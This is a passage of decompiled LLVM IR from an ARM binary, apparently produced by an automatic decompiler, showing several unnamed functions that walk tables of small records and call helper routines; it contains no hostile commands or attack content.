dec_label_pc_8380:                                ; preds = %dec_label_pc_8380, %dec_label_pc_8360
  %v1_8384 = phi i32 [ %v1_83b0, %dec_label_pc_8380 ], [ %v2_836c, %dec_label_pc_8360 ]
  %v0_8380 = phi i32 [ %v1_83ac, %dec_label_pc_8380 ], [ %v1_837c, %dec_label_pc_8360 ]
  %v1_8380 = add i32 %v0_8380, -5
  %v2_8380 = inttoptr i32 %v1_8380 to i32*
  %v3_8380 = load i32, i32* %v2_8380, align 4
  store i32 %v3_8380, i32* %r1.global-to-local, align 4
  %v2_8384 = add i32 %v1_8384, 16
  %v3_8384 = inttoptr i32 %v2_8384 to i32*
  store i32 %v3_8380, i32* %v3_8384, align 4
  %v0_8388 = load i32, i32* @r7, align 4
  %v1_8388 = add i32 %v0_8388, -6
  store i32 %v1_8388, i32* %r3.global-to-local, align 4
  %v0_838c = load i32, i32* %r0.global-to-local, align 4
  %v1_838c = add i32 %v0_838c, -1
  %v2_838c = inttoptr i32 %v1_838c to i8*
  %v3_838c = load i8, i8* %v2_838c, align 1
  %v4_838c = zext i8 %v3_838c to i32
  store i32 %v4_838c, i32* %r2.global-to-local, align 4
  %v0_8390 = load i32, i32* @r6, align 4
  %v1_8390 = add i32 %v0_8390, -5
  store i32 %v1_8390, i32* @r6, align 4
  %v9_8394 = icmp eq i32 %v1_8390, %v1_8388
  store i1 %v9_8394, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_838c, i32* @r4, align 4
  %v2_83a0 = load i32, i32* @ip, align 4
  %v3_83a0 = add i32 %v2_83a0, 20
  %v4_83a0 = inttoptr i32 %v3_83a0 to i8*
  store i8 %v3_838c, i8* %v4_83a0, align 1
  %v0_83a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_83a4 = load i32, i32* @ip, align 4
  %v2_83a4 = add i32 %v1_83a4, 4
  %v3_83a4 = inttoptr i32 %v2_83a4 to i32*
  store i32 %v0_83a4, i32* %v3_83a4, align 4
  %v0_83a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_83a8 = trunc i32 %v0_83a8 to i16
  %v2_83a8 = load i32, i32* @ip, align 4
  %v3_83a8 = inttoptr i32 %v2_83a8 to i16*
  store i16 %v1_83a8, i16* %v3_83a8, align 2
  %v0_83ac = load i32, i32* %r0.global-to-local, align 4
  %v1_83ac = add i32 %v0_83ac, 5
  store i32 %v1_83ac, i32* %r0.global-to-local, align 4
  %v0_83b0 = load i32, i32* @ip, align 4
  %v1_83b0 = add i32 %v0_83b0, 24
  store i32 %v1_83b0, i32* @ip, align 4
  %v0_83b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83b4, label %dec_label_pc_83b8, label %dec_label_pc_8380

dec_label_pc_83b8:                                ; preds = %dec_label_pc_8380
  %v0_83b8 = load i32, i32* @r6, align 4
  %v2_83b8 = icmp eq i32 %v0_83b8, 0
  store i1 %v2_83b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83b8, label %dec_label_pc_84bc, label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_83b8
  %v0_83c0 = load i32, i32* @r4, align 4
  %v1_83c0 = inttoptr i32 %v0_83c0 to i8*
  %v2_83c0 = load i8, i8* %v1_83c0, align 1
  %v3_83c0 = zext i8 %v2_83c0 to i32
  store i32 %v3_83c0, i32* @r5, align 4
  %v2_83c4 = icmp eq i8 %v2_83c0, 0
  store i1 %v2_83c4, i1* %cpsr_z.global-to-local, align 1
  %v0_83c8 = load i32, i32* @r7, align 4
  %v1_83c8 = add i32 %v0_83c8, -7
  store i32 %v1_83c8, i32* @r8, align 4
  br i1 %v2_83c4, label %bb, label %dec_label_pc_83d4

bb:                                               ; preds = %dec_label_pc_83c0
  store i32 %v3_83c0, i32* @r6, align 4
  br label %dec_label_pc_8498

dec_label_pc_83d4:                                ; preds = %dec_label_pc_83c0
  store i32 %v3_83c0, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_83dc = call i32 @function_12654(i32 %v3_83c0, i32 8)
  store i32 %v2_83dc, i32* %r0.global-to-local, align 4
  %v0_83e0 = load i32, i32* @r8, align 4
  %v2_83e0 = icmp eq i32 %v0_83e0, 0
  store i1 %v2_83e0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_83dc, i32* @r6, align 4
  br i1 %v2_83e0, label %dec_label_pc_84bc, label %dec_label_pc_83ec

dec_label_pc_83ec:                                ; preds = %dec_label_pc_83d4
  %v0_83ec = load i32, i32* @r4, align 4
  %v1_83ec = add i32 %v0_83ec, 1
  %v2_83ec = inttoptr i32 %v1_83ec to i8*
  %v3_83ec = load i8, i8* %v2_83ec, align 1
  %v0_83f0 = load i32, i32* @r7, align 4
  %v7_83f0 = icmp eq i32 %v0_83f0, 8
  store i1 %v7_83f0, i1* %cpsr_z.global-to-local, align 1
  %v3_83f4 = add i32 %v2_83dc, 4
  %v4_83f4 = inttoptr i32 %v3_83f4 to i8*
  store i8 %v3_83ec, i8* %v4_83f4, align 1
  %v0_83f8 = load i32, i32* @r4, align 4
  %v1_83f8 = add i32 %v0_83f8, 1
  store i32 %v1_83f8, i32* %r3.global-to-local, align 4
  %v0_83fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83fc, label %dec_label_pc_84bc, label %dec_label_pc_8400

dec_label_pc_8400:                                ; preds = %dec_label_pc_83ec
  %v1_8400 = add i32 %v0_83f8, 2
  %v2_8400 = inttoptr i32 %v1_8400 to i8*
  %v3_8400 = load i8, i8* %v2_8400, align 1
  %v4_8400 = zext i8 %v3_8400 to i32
  store i32 %v4_8400, i32* @r4, align 4
  %v0_8404 = load i32, i32* @r7, align 4
  %v1_8404 = add i32 %v0_8404, -9
  store i32 %v1_8404, i32* @r8, align 4
  %v9_8408 = icmp eq i32 %v1_8404, %v4_8400
  store i1 %v9_8408, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8400, i32* %r1.global-to-local, align 4
  %v5_8410 = icmp slt i32 %v1_8404, %v4_8400
  br i1 %v5_8410, label %dec_label_pc_84bc, label %bb35

bb35:                                             ; preds = %dec_label_pc_8400
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_84147 = add i32 %v0_83f8, 3
  store i32 %v7_84147, i32* @r7, align 4
  %v6_8418 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8418, i32* @sl, align 4
  br label %dec_label_pc_845c

dec_label_pc_8428:                                ; preds = %dec_label_pc_845c
  %v0_8428 = load i32, i32* @r8, align 4
  %v1_8428 = load i32, i32* @r4, align 4
  %v2_8428 = sub i32 %v0_8428, %v1_8428
  store i32 %v2_8428, i32* %r2.global-to-local, align 4
  %v9_8428 = icmp eq i32 %v0_8428, %v1_8428
  store i1 %v9_8428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8428, label %dec_label_pc_84bc, label %dec_label_pc_8430

dec_label_pc_8430:                                ; preds = %dec_label_pc_8428
  %v1_8430 = load i32, i32* @r7, align 4
  %v2_8430 = add i32 %v1_8430, %v1_8428
  %v3_8430 = inttoptr i32 %v2_8430 to i8*
  %v4_8430 = load i8, i8* %v3_8430, align 1
  store i32 %v2_8430, i32* %r0.global-to-local, align 4
  %v1_8438 = add i32 %v2_8428, -1
  store i32 %v1_8438, i32* %r2.global-to-local, align 4
  %v7_8438 = icmp eq i32 %v2_8428, 1
  store i1 %v7_8438, i1* %cpsr_z.global-to-local, align 1
  %v3_843c = add i32 %v2_8490, 4
  %v4_843c = inttoptr i32 %v3_843c to i8*
  store i8 %v4_8430, i8* %v4_843c, align 1
  %v0_8440 = load i32, i32* %r0.global-to-local, align 4
  %v1_8440 = add i32 %v0_8440, 1
  store i32 %v1_8440, i32* %r3.global-to-local, align 4
  %v0_8444 = load i32, i32* %r2.global-to-local, align 4
  %v1_8444 = add i32 %v0_8444, -1
  store i32 %v1_8444, i32* @r8, align 4
  %v1_8448 = add i32 %v0_8440, 2
  store i32 %v1_8448, i32* @r7, align 4
  %v0_844c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_844c, label %dec_label_pc_84bc, label %dec_label_pc_8450

dec_label_pc_8450:                                ; preds = %dec_label_pc_8430
  %v2_8450 = inttoptr i32 %v1_8440 to i8*
  %v3_8450 = load i8, i8* %v2_8450, align 1
  %v4_8450 = zext i8 %v3_8450 to i32
  store i32 %v4_8450, i32* @r4, align 4
  %v2_8454 = sub i32 %v1_8444, %v4_8450
  %tmp36 = sub i32 0, %v2_8454
  %v6_8454 = and i32 %v1_8444, %tmp36
  %v7_8454 = icmp slt i32 %v6_8454, 0
  %v8_8454 = icmp slt i32 %v2_8454, 0
  %v9_8454 = icmp eq i32 %v1_8444, %v4_8450
  store i1 %v9_8454, i1* %cpsr_z.global-to-local, align 1
  %v2_8458 = xor i1 %v8_8454, %v7_8454
  br i1 %v2_8458, label %dec_label_pc_84bc, label %dec_label_pc_845c

dec_label_pc_845c:                                ; preds = %bb35, %dec_label_pc_8450
  %v0_8460 = phi i32 [ %v4_8400, %bb35 ], [ %v4_8450, %dec_label_pc_8450 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_8470, %dec_label_pc_8450 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_8460 = add nuw nsw i32 %v0_8460, 1
  store i32 %v1_8460, i32* %r0.global-to-local, align 4
  %v2_8464 = call i32 @function_12654(i32 %v1_8460, i32 1)
  store i32 %v2_8464, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_846c = load i32, i32* @sl, align 4
  %v2_846c = inttoptr i32 %v1_846c to i32*
  store i32 %v2_8464, i32* %v2_846c, align 4
  %v0_8470 = load i32, i32* %r3.global-to-local, align 4
  %v1_8470 = add i32 %v0_8470, 1
  store i32 %v1_8470, i32* %r3.global-to-local, align 4
  %v0_8474 = load i32, i32* @r4, align 4
  store i32 %v0_8474, i32* %r2.global-to-local, align 4
  %v0_8478 = load i32, i32* @r7, align 4
  store i32 %v0_8478, i32* %r1.global-to-local, align 4
  %v3_8480 = call i32 @function_108bc(i32 %v2_8464, i32 %v0_8478, i32 %v0_8474)
  store i32 %v3_8480, i32* %r0.global-to-local, align 4
  store i32 %v1_8470, i32* %r2.global-to-local, align 4
  %v3_8488 = mul i32 %v1_8470, 8
  store i32 %v3_8488, i32* %r3.global-to-local, align 4
  %v1_848c = load i32, i32* @r5, align 4
  %v9_848c = icmp eq i32 %v1_8470, %v1_848c
  store i1 %v9_848c, i1* %cpsr_z.global-to-local, align 1
  %v0_8490 = load i32, i32* @r6, align 4
  %v2_8490 = add i32 %v0_8490, %v3_8488
  store i32 %v2_8490, i32* @sl, align 4
  br i1 %v9_848c, label %dec_label_pc_8498, label %dec_label_pc_8428

dec_label_pc_8498:                                ; preds = %dec_label_pc_845c, %bb
  %v0_8498 = call i32 @function_11734()
  %v2_84a0 = inttoptr i32 %v0_8498 to i32*
  store i32 0, i32* %v2_84a0, align 4
  store i32 %v4_8330, i32* %r1.global-to-local, align 4
  %v0_84a8 = load i32, i32* @fp, align 4
  store i32 %v0_84a8, i32* %r0.global-to-local, align 4
  %v0_84ac = load i32, i32* @sb, align 4
  store i32 %v0_84ac, i32* %r2.global-to-local, align 4
  store i32 %v2_836c, i32* %r3.global-to-local, align 4
  %v2_84b4 = load i32, i32* @r5, align 4
  %v5_84b4 = load i32, i32* @r6, align 4
  %v6_84b8 = trunc i32 %v2_84b4 to i8
  %v7_84b8 = call i32 @function_81ec(i32 %v0_84a8, i32 %v4_8330, i32 %v0_84ac, i32 %v2_836c, i8 %v6_84b8, i32 %v5_84b4)
  store i32 %v7_84b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_84bc

dec_label_pc_84bc:                                ; preds = %dec_label_pc_8450, %dec_label_pc_8430, %dec_label_pc_8428, %dec_label_pc_8400, %dec_label_pc_83ec, %dec_label_pc_83d4, %dec_label_pc_83b8, %dec_label_pc_8498
  store i32 %v2_836c, i32* %r3.global-to-local, align 4
  %v2_84c0 = icmp eq i32 %v2_836c, 0
  store i1 %v2_84c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84c0, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_84bc
  store i32 %v2_836c, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_84bc, %bb37
  store i32 33996, i32* @lr, align 4
  %v1_84c8 = xor i1 %v2_84c0, true
  call void @__pseudo_cond_branch(i1 %v1_84c8, i32 ptrtoint (i32* @global_var_12da0.21 to i32))
  %v0_84cc = load i32, i32* @r6, align 4
  %v2_84cc = icmp eq i32 %v0_84cc, 0
  store i1 %v2_84cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84cc, label %.dec_label_pc_8300_crit_edge, label %dec_label_pc_84d4

.dec_label_pc_8300_crit_edge:                     ; preds = %bb38
  %v1_8308.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8300

dec_label_pc_84d4:                                ; preds = %bb38
  %v0_84d4 = load i32, i32* @r5, align 4
  %v2_84d4 = icmp eq i32 %v0_84d4, 0
  store i1 %v2_84d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84d4, label %dec_label_pc_84f8, label %dec_label_pc_84dc

dec_label_pc_84dc:                                ; preds = %dec_label_pc_84d4
  br label %dec_label_pc_84e0

dec_label_pc_84e0:                                ; preds = %dec_label_pc_84e0, %dec_label_pc_84dc
  %v0_84e8 = phi i32 [ 0, %dec_label_pc_84dc ], [ %v1_84f0, %dec_label_pc_84e0 ]
  %v0_84e0 = phi i32 [ %v0_84cc, %dec_label_pc_84dc ], [ %v0_84f8.pre, %dec_label_pc_84e0 ]
  %v4_84e0 = mul i32 %v0_84e8, 8
  %v5_84e0 = add i32 %v4_84e0, %v0_84e0
  %v6_84e0 = inttoptr i32 %v5_84e0 to i32*
  %v7_84e0 = load i32, i32* %v6_84e0, align 4
  store i32 %v7_84e0, i32* %r0.global-to-local, align 4
  %v2_84e4 = icmp eq i32 %v7_84e0, 0
  store i1 %v2_84e4, i1* %cpsr_z.global-to-local, align 1
  %v1_84e8 = add i32 %v0_84e8, 1
  store i32 %v1_84e8, i32* @r4, align 4
  store i32 34032, i32* @lr, align 4
  %v1_84ec = xor i1 %v2_84e4, true
  call void @__pseudo_cond_branch(i1 %v1_84ec, i32 ptrtoint (i32* @global_var_12da0.21 to i32))
  %v0_84f0 = load i32, i32* @r5, align 4
  %v1_84f0 = load i32, i32* @r4, align 4
  %v9_84f0 = icmp eq i32 %v0_84f0, %v1_84f0
  store i1 %v9_84f0, i1* %cpsr_z.global-to-local, align 1
  %v0_84f8.pre = load i32, i32* @r6, align 4
  br i1 %v9_84f0, label %dec_label_pc_84f8, label %dec_label_pc_84e0

dec_label_pc_84f8:                                ; preds = %dec_label_pc_84e0, %dec_label_pc_84d4
  %v0_84f8 = phi i32 [ %v0_84cc, %dec_label_pc_84d4 ], [ %v0_84f8.pre, %dec_label_pc_84e0 ]
  store i32 %v0_84f8, i32* @r0, align 4
  %v0_84fc = call i32 @function_12da0()
  store i32 %v0_84fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8300

; uselistorder directives
  uselistorder i32 %v0_84fc, { 1, 0 }
  uselistorder i32 %v1_84f0, { 1, 0 }
  uselistorder i1 %v2_84c0, { 0, 2, 1 }
  uselistorder i32 %v2_8490, { 1, 0 }
  uselistorder i32 %v3_8488, { 1, 0 }
  uselistorder i32 %v1_8470, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_8454, { 1, 0 }
  uselistorder i32 %v4_8450, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8444, { 2, 0, 1, 3 }
  uselistorder i32 %v3_83c0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83b0, { 1, 0 }
  uselistorder i32 %v1_83ac, { 1, 0 }
  uselistorder i32 %v2_836c, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_8340, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8310, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_830c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_82f8, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 20, 3, 21, 5, 8, 10, 9, 6, 7, 16, 17, 11, 12, 13, 14, 15, 18, 19, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_84bc, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_845c, { 1, 0 }
  uselistorder label %dec_label_pc_8300, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @function_8504(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8504:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_8504 = icmp eq i32 %arg1, 0
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8504, label %dec_label_pc_854c, label %dec_label_pc_8514

dec_label_pc_8514:                                ; preds = %dec_label_pc_8504
  %v0_8514 = load i32, i32* %r1.global-to-local, align 4
  %v1_8514 = add i32 %v0_8514, 4
  %v2_8514 = inttoptr i32 %v1_8514 to i8*
  %v3_8514 = load i8, i8* %v2_8514, align 1
  %v4_8514 = zext i8 %v3_8514 to i32
  %v9_8518 = icmp eq i32 %v4_8514, %arg3
  br i1 %v9_8518, label %dec_label_pc_8558, label %dec_label_pc_853c.preheader

dec_label_pc_853c.preheader:                      ; preds = %dec_label_pc_8514
  br label %dec_label_pc_853c

dec_label_pc_852c:                                ; preds = %dec_label_pc_853c
  %v1_852c = add i32 %v0_8534.in, 12
  %v2_852c = inttoptr i32 %v1_852c to i8*
  %v3_852c = load i8, i8* %v2_852c, align 1
  %v4_852c = zext i8 %v3_852c to i32
  %v9_8530 = icmp eq i32 %v4_852c, %arg3
  br i1 %v9_8530, label %dec_label_pc_8558, label %dec_label_pc_853c

dec_label_pc_853c:                                ; preds = %dec_label_pc_853c.preheader, %dec_label_pc_852c
  %v0_8534.in = phi i32 [ %v0_8514, %dec_label_pc_853c.preheader ], [ %v0_8534, %dec_label_pc_852c ]
  %v0_853c = phi i32 [ 0, %dec_label_pc_853c.preheader ], [ %v1_853c, %dec_label_pc_852c ]
  %v0_8534 = add i32 %v0_8534.in, 8
  %v1_853c = add i32 %v0_853c, 1
  %v9_8540 = icmp eq i32 %v1_853c, %arg1
  store i32 %v0_8534, i32* %r1.global-to-local, align 4
  br i1 %v9_8540, label %dec_label_pc_854c, label %dec_label_pc_852c

dec_label_pc_854c:                                ; preds = %dec_label_pc_853c, %dec_label_pc_8558, %dec_label_pc_8504, %dec_label_pc_8564
  %v0_854c = phi i32 [ %arg4, %dec_label_pc_8558 ], [ %arg4, %dec_label_pc_8504 ], [ %v1_8564, %dec_label_pc_8564 ], [ %arg4, %dec_label_pc_853c ]
  ret i32 %v0_854c

dec_label_pc_8558:                                ; preds = %dec_label_pc_852c, %dec_label_pc_8514
  %v0_8558 = phi i32 [ %v0_8514, %dec_label_pc_8514 ], [ %v0_8534, %dec_label_pc_852c ]
  %v1_8558 = inttoptr i32 %v0_8558 to i32*
  %v2_8558 = load i32, i32* %v1_8558, align 4
  store i32 %v2_8558, i32* @r0, align 4
  %v2_855c = icmp eq i32 %v2_8558, 0
  br i1 %v2_855c, label %dec_label_pc_854c, label %dec_label_pc_8564

dec_label_pc_8564:                                ; preds = %dec_label_pc_8558
  %v1_8564 = call i32 @function_11874(i32 %v2_8558)
  br label %dec_label_pc_854c

; uselistorder directives
  uselistorder i32 %v1_853c, { 1, 0 }
  uselistorder i32 %v0_8534, { 1, 0, 2 }
  uselistorder i32 %v0_8534.in, { 1, 0 }
  uselistorder i32 %v0_8514, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_854c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_853c, { 1, 0 }
}

define i32 @function_8570(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8570:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8570 = icmp eq i32 %arg1, 0
  %v3_8574 = load i32, i32* @r4, align 4
  store i32 %v3_8574, i32* %stack_var_-8, align 4
  %v6_8574 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8570, label %dec_label_pc_85b8, label %dec_label_pc_8580

dec_label_pc_8580:                                ; preds = %dec_label_pc_8570
  %v0_8580 = load i32, i32* %r1.global-to-local, align 4
  %v1_8580 = add i32 %v0_8580, 4
  %v2_8580 = inttoptr i32 %v1_8580 to i8*
  %v3_8580 = load i8, i8* %v2_8580, align 1
  %v4_8580 = zext i8 %v3_8580 to i32
  %v9_8584 = icmp eq i32 %v4_8580, %arg3
  br i1 %v9_8584, label %dec_label_pc_85c4, label %dec_label_pc_85a8.preheader

dec_label_pc_85a8.preheader:                      ; preds = %dec_label_pc_8580
  br label %dec_label_pc_85a8

dec_label_pc_8598:                                ; preds = %dec_label_pc_85a8
  %v1_8598 = add i32 %v0_85a0.in, 12
  %v2_8598 = inttoptr i32 %v1_8598 to i8*
  %v3_8598 = load i8, i8* %v2_8598, align 1
  %v4_8598 = zext i8 %v3_8598 to i32
  %v9_859c = icmp eq i32 %v4_8598, %arg3
  br i1 %v9_859c, label %dec_label_pc_85c4, label %dec_label_pc_85a8

dec_label_pc_85a8:                                ; preds = %dec_label_pc_85a8.preheader, %dec_label_pc_8598
  %v0_85a0.in = phi i32 [ %v0_8580, %dec_label_pc_85a8.preheader ], [ %v0_85a0, %dec_label_pc_8598 ]
  %v0_85a8 = phi i32 [ 0, %dec_label_pc_85a8.preheader ], [ %v1_85a8, %dec_label_pc_8598 ]
  %v0_85a0 = add i32 %v0_85a0.in, 8
  %v1_85a8 = add i32 %v0_85a8, 1
  store i32 %v1_85a8, i32* @lr, align 4
  %v9_85ac = icmp eq i32 %v1_85a8, %arg1
  store i32 %v0_85a0, i32* %r1.global-to-local, align 4
  br i1 %v9_85ac, label %dec_label_pc_85b8, label %dec_label_pc_8598

dec_label_pc_85b8:                                ; preds = %dec_label_pc_85a8, %dec_label_pc_85c4, %dec_label_pc_8570, %dec_label_pc_85d0
  %v2_85bc = phi i32 [ %v3_8574, %dec_label_pc_85c4 ], [ %v3_8574, %dec_label_pc_8570 ], [ %v2_85bc.pre, %dec_label_pc_85d0 ], [ %v3_8574, %dec_label_pc_85a8 ]
  %v0_85b8 = phi i32 [ %arg4, %dec_label_pc_85c4 ], [ %arg4, %dec_label_pc_8570 ], [ %v3_85d4, %dec_label_pc_85d0 ], [ %arg4, %dec_label_pc_85a8 ]
  store i32 %v2_85bc, i32* @r4, align 4
  store i32 %v6_8574, i32* @lr, align 4
  ret i32 %v0_85b8

dec_label_pc_85c4:                                ; preds = %dec_label_pc_8598, %dec_label_pc_8580
  %v0_85c4 = phi i32 [ %v0_8580, %dec_label_pc_8580 ], [ %v0_85a0, %dec_label_pc_8598 ]
  %v1_85c4 = inttoptr i32 %v0_85c4 to i32*
  %v2_85c4 = load i32, i32* %v1_85c4, align 4
  %v2_85c8 = icmp eq i32 %v2_85c4, 0
  br i1 %v2_85c8, label %dec_label_pc_85b8, label %dec_label_pc_85d0

dec_label_pc_85d0:                                ; preds = %dec_label_pc_85c4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_85d4 = inttoptr i32 %v2_85c4 to i8*
  %v3_85d4 = call i32 @function_10970(i8* %v2_85d4, i32 10)
  %v2_85bc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_85b8

; uselistorder directives
  uselistorder i32 %v1_85a8, { 1, 2, 0 }
  uselistorder i32 %v0_85a0, { 1, 0, 2 }
  uselistorder i32 %v0_85a0.in, { 1, 0 }
  uselistorder i32 %v0_8580, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_85b8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_85a8, { 1, 0 }
}

define i32 @function_85e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_85e0:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_85e0 = load i32, i32* @r4, align 4
  store i32 %v3_85e0, i32* %stack_var_-24, align 4
  %v6_85e0 = load i32, i32* @r5, align 4
  %v9_85e0 = load i32, i32* @r6, align 4
  %v12_85e0 = load i32, i32* @r7, align 4
  %v15_85e0 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_85ec = call i32 @function_12654(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_1f24c.17 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1f250.19 to i32), i32* @r6, align 4
  store i32 36524, i32* %r2.global-to-local, align 4
  store i32 %v2_85ec, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1f24d.25 to i32), i32* %r1.global-to-local, align 4
  %v2_860c = load i32, i32* @global_var_1f250.19, align 4
  %v2_8610 = inttoptr i32 %v2_85ec to i32*
  store i32 36524, i32* %v2_8610, align 4
  %v3_8614 = load i32, i32* @r5, align 4
  %v4_8614 = add i32 %v3_8614, 4
  %v5_8614 = inttoptr i32 %v4_8614 to i8*
  store i8 0, i8* %v5_8614, align 1
  %v0_8618 = load i32, i32* %r1.global-to-local, align 4
  %v3_8618 = mul i32 %v0_8618, 4
  store i32 %v3_8618, i32* %r1.global-to-local, align 4
  %v5_861c = inttoptr i32 %v2_860c to i32*
  %v6_861c = call i32 @function_12788(i32* %v5_861c, i32 %v3_8618, i32 36524, i32 0)
  %v2_8620 = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_8620 = zext i8 %v2_8620 to i32
  store i32 %v6_861c, i32* %r2.global-to-local, align 4
  %v0_8628 = load i32, i32* @r5, align 4
  %v5_8628 = mul nuw nsw i32 %v3_8620, 4
  %v6_8628 = add i32 %v5_8628, %v6_861c
  %v7_8628 = inttoptr i32 %v6_8628 to i32*
  store i32 %v0_8628, i32* %v7_8628, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1f24d.25 to i32), i32* %r3.global-to-local, align 4
  %v1_8638 = load i32, i32* @r6, align 4
  %v2_8638 = inttoptr i32 %v1_8638 to i32*
  store i32 %v6_861c, i32* %v2_8638, align 4
  %v0_863c = load i32, i32* %r3.global-to-local, align 4
  %v1_863c = trunc i32 %v0_863c to i8
  %v2_863c = load i32, i32* @r4, align 4
  %v3_863c = inttoptr i32 %v2_863c to i8*
  store i8 %v1_863c, i8* %v3_863c, align 1
  %v2_8640 = call i32 @function_12654(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_a048.27 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_8640, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_1f24d.25 to i32), i32* %r1.global-to-local, align 4
  %v2_8658 = load i32, i32* @global_var_1f250.19, align 4
  %v2_865c = inttoptr i32 %v2_8640 to i32*
  store i32 ptrtoint (i32* @global_var_a048.27 to i32), i32* %v2_865c, align 4
  %v0_8660 = load i32, i32* @r8, align 4
  %v1_8660 = trunc i32 %v0_8660 to i8
  %v2_8660 = load i32, i32* @r5, align 4
  %v3_8660 = add i32 %v2_8660, 4
  %v4_8660 = inttoptr i32 %v3_8660 to i8*
  store i8 %v1_8660, i8* %v4_8660, align 1
  %v0_8664 = load i32, i32* %r1.global-to-local, align 4
  %v3_8664 = mul i32 %v0_8664, 4
  store i32 %v3_8664, i32* %r1.global-to-local, align 4
  %v4_8668 = inttoptr i32 %v2_8658 to i32*
  %v5_8668 = call i32 @function_12788(i32* %v4_8668, i32 %v3_8664, i32 %v6_861c, i32 ptrtoint (i32* @global_var_a048.27 to i32))
  %v2_866c = load i8, i8* bitcast (i8** @global_var_1f24c.17 to i8*), align 4
  %v3_866c = zext i8 %v2_866c to i32
  store i32 %v3_866c, i32* %r3.global-to-local, align 4
  store i32 %v5_8668, i32* %r2.global-to-local, align 4
  %v0_8674 = load i32, i32* @r5, align 4
  %v5_8674 = mul nuw nsw i32 %v3_866c, 4
  %v6_8674 = add i32 %v5_8674, %v5_8668
  %v7_8674 = inttoptr i32 %v6_8674 to i32*
  store i32 %v0_8674, i32* %v7_8674, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_867c = load i32, i32* %r3.global-to-local, align 4
  %v1_867c = load i32, i32* @r8, align 4
  %v2_867c = add i32 %v1_867c, %v0_867c
